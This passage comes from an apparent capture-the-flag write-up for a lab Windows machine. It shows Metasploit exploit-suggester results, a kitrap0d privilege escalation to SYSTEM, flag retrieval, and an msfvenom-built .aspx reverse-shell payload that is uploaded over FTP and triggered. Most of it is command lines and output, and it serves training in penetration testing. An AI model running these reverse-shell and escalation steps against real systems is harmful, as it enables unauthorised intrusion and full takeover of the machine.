[+] 10.129.135.184 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.129.135.184 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.135.184 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.129.135.184 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.129.135.184 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
We could've used `meterpreter > run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true` as well.

We'll try `exploit/windows/local/ms10_015_kitrap0d` on the meterpreter session, as we've used/seen this before and as a result more familiar with it.

NOTE: Exploit `exploit/windows/local/ms10_015_kitrap0d` worked without navigating to `%temp%` as indicated by the official write-up.
```
meterpreter > background
[*] Backgrounding session 3...
msf6 post(multi/manage/shell_to_meterpreter) > back
msf6 > use exploit/windows/local/ms10_015_kitrap0d
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options
...
msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf6 exploit(windows/local/ms10_015_kitrap0d) > set lport 2121
lport => 2121
msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 3
session => 3
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.x.x:2121 
[*] Launching notepad to host the exploit...
[+] Process 1748 launched.
[*] Reflectively injecting the exploit DLL into 1748...
[*] Injecting exploit into 1748 ...
[*] Exploit injected. Injecting payload into 1748...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.129.135.184
[*] Meterpreter session 4 opened (10.10.x.x:2121 -> 10.129.135.184:49161) at 2021-04-25 22:29:27 +0800

meterpreter > 
```
Oh yeah!! It works!

Seeing active sessions..
```
msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  2         shell x86/windows        Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.x.x:4545 -> 10.129.135.184:49159 (10.129.135.184)
  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL                                                           10.10.x.x:4433 -> 10.129.135.184:49160 (10.129.135.184)
  4         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL                                                       10.10.x.x:2121 -> 10.129.135.184:49161 (10.129.135.184)

```
Time to go into session 4 to get flags and we're done!
```
msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions -i 4
[*] Starting interaction with 4...
...
meterpreter > pwd
c:\
meterpreter > ls
[-] Error running command ls: NoMethodError undefined method `[]' for nil:NilClass
```
This is weird, seems to be some bug where we can't list what's on the directory. There is a work around though!
```
meterpreter > shell
Process 148 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of C:\

11/06/2009  12:42 ��                24 autoexec.bat
11/06/2009  12:42 ��                10 config.sys
17/03/2017  07:33 ��    <DIR>          inetpub
14/07/2009  05:37 ��    <DIR>          PerfLogs
13/12/2020  01:59 ��    <DIR>          Program Files
18/03/2017  02:16 ��    <DIR>          Users
14/01/2021  12:48 ��    <DIR>          Windows
               2 File(s)             34 bytes
               5 Dir(s)  22.199.873.536 bytes free
...
C:\Users\babis\Desktop>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of C:\Users\babis\Desktop

18/03/2017  02:14 ��    <DIR>          .
18/03/2017  02:14 ��    <DIR>          ..
18/03/2017  02:18 ��                32 user.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  22.199.873.536 bytes free

C:\Users\babis\Desktop>type user.txt.txt
type user.txt.txt
9ecdd6a3aedf24b41562fea70f4cb3e8
...
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of C:\Users\Administrator\Desktop

14/01/2021  12:42 ��    <DIR>          .
14/01/2021  12:42 ��    <DIR>          ..
18/03/2017  02:17 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  22.199.873.536 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
e621a0b5041708797c4fc4728bc72b4b
```

## 9. Alternative Reverse Shell, with Meterpreter & MSFVenom
NOTE: THIS IS AN ALTERNATE METHOD AS SHOWN IN OFFICIAL WRITE-UP

Let's generate a custom `.aspx` reverse shell. [(Source)](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
```
msf5 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx
[*] exec: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2818 bytes
```

Same shit, put the `.aspx` in the FTP with `ftp> put devel.aspx`.
Of course run a `msf5 > use exploit/multi/handler`, setting the correct payload and execute `http://10.10.10.5/devel.aspx` to get a reverse shell.
```
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
...
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.x.x:9999 
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 12 opened (10.10.x.x:9999 -> 10.10.10.5:49161) at 2020-11-29 00:59:11 +0800
```
We got a Meterpreter shell immediately, and can skip past using `post/multi/manage/shell_to_meterpreter`.

We navigate to `%temp%` directory where this is best explained by the official write up: "By default, the working directory is set to c:\windows\system32\inetsrv, which the IIS user does not have write permissions for. Navigating to c:\windows\TEMP is a good idea, as a large portion of Metasploit’s Windows privilege escalation modules require a file to be written to the target during exploitation."

We then run `ms10_015_kitrap0d` and we're done.
```
meterpreter > pwd
c:\windows\system32\inetsrv
meterpreter > cd %temp%
meterpreter > pwd
C:\Windows\TEMP
...
meterpreter > getuid
Server username: IIS APPPOOL\Web
...
msf5 > use exploit/windows/local/ms10_015_kitrap0d
...
msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.x.x:6832 
...
[*] Meterpreter session 13 opened (10.10.x.x:6832 -> 10.10.10.5:49162) at 2020-11-29 01:00:48 +0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
